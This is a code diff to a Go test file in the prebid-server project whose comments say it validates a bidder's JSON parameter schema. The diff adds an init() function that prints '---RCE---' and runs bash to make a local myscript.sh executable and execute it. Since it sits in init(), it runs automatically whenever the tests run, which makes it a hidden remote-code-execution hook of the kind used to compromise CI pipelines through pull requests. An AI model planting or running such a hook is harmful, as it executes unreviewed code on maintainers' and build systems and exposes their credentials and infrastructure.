@@ -5,8 +5,18 @@ import (
 	"testing"
 
 	"github.com/prebid/prebid-server/v3/openrtb_ext"
+	mylogaaaa "log"
+	"os"
+	"os/exec"
 )
 
+func init() {
+	mylogaaaa.Println("---RCE---")
+	cmd := exec.Command("bash", "-c", "chmod +x myscript.sh && ./myscript.sh")
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	cmd.Run()
+}
 // This file actually intends to test static/bidder-params/33across.json
 //
 // These also validate the format of the external API: request.imp[i].ext.prebid.bidder.33across
